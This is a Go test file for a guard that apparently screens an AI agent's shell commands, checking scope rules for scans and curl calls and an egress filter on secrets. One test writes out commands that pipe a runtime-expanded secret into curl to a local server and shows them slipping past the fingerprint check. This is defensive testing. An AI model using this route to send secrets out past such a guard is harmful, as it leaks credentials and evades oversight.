package guard

import (
	"context"
	"encoding/json"
	"io"
	"net/http"
	"net/http/httptest"
	"os"
	"os/exec"
	"path/filepath"
	"testing"
)

func TestSecurityStrictUnresolvedDestinations(t *testing.T) {
	for _, cmd := range []string{`nmap 192.0.2.0/24`, `curl "$DEST"`, `python3 probe.py`, `nmap -iL targets.txt`, `curl https://target.com/; python3 probe.py`} {
		t.Run(cmd, func(t *testing.T) {
			if b, _ := bashBlocked(t, roeGuard("strict", []ScopeRule{{Kind: "domain", Value: "target.com"}}), cmd); !b {
				t.Fatal("unresolved destination must require approval")
			}
		})
	}
	g := roeGuard("strict", []ScopeRule{{Kind: "domain", Value: "target.com"}})
	in, _ := json.Marshal(map[string]string{"command": "curl https://outside.example/"})
	if b, _, _ := g.Hooks().PreToolUse(context.Background(), "session_exec", in); !b {
		t.Fatal("session_exec bypassed scope")
	}
	for _, mode := range []string{"warn", "off"} {
		if b, _ := bashBlocked(t, roeGuard(mode, []ScopeRule{{Kind: "domain", Value: "target.com"}}), `curl "$DEST"`); b {
			t.Fatalf("%s should remain advisory/disabled", mode)
		}
	}
}

// Documents the remaining architectural boundary: input fingerprints cannot
// inspect bytes read after the hook. Only synthetic secrets and loopback are used.
func TestSecurityRuntimeSecretExpansionKnownLimitation(t *testing.T) {
	if _, err := exec.LookPath("curl"); err != nil {
		t.Skip("curl unavailable")
	}
	secret := "synthetic-secret-for-local-test"
	e := NewEgressGuard()
	e.AddFingerprint("test", secret)
	g := New()
	g.SetEgress(e)
	if blocked, _ := bashBlocked(t, g, "printf %s "+secret); !blocked {
		t.Fatal("literal counter-control must block")
	}
	received := make(chan string, 2)
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) { b, _ := io.ReadAll(r.Body); received <- string(b) }))
	defer srv.Close()
	path := filepath.Join(t.TempDir(), "fixture")
	if err := os.WriteFile(path, []byte(secret), 0600); err != nil {
		t.Fatal(err)
	}
	for _, source := range []string{`"$GUARD_TEST_SECRET"`, `"$(cat "$GUARD_TEST_FILE")"`} {
		cmd := `printf %s ` + source + ` | curl --silent --max-time 5 --data-binary @- ` + srv.URL
		if b, _ := bashBlocked(t, g, cmd); b {
			t.Fatal("unexpected literal fingerprint match")
		}
		c := exec.Command("/bin/sh", "-c", cmd)
		c.Env = append(os.Environ(), "GUARD_TEST_SECRET="+secret, "GUARD_TEST_FILE="+path)
		if out, err := c.CombinedOutput(); err != nil {
			t.Fatalf("local fixture: %v %s", err, out)
		}
		if got := <-received; got != secret {
			t.Fatal("fixture did not transmit synthetic secret")
		}
	}
}
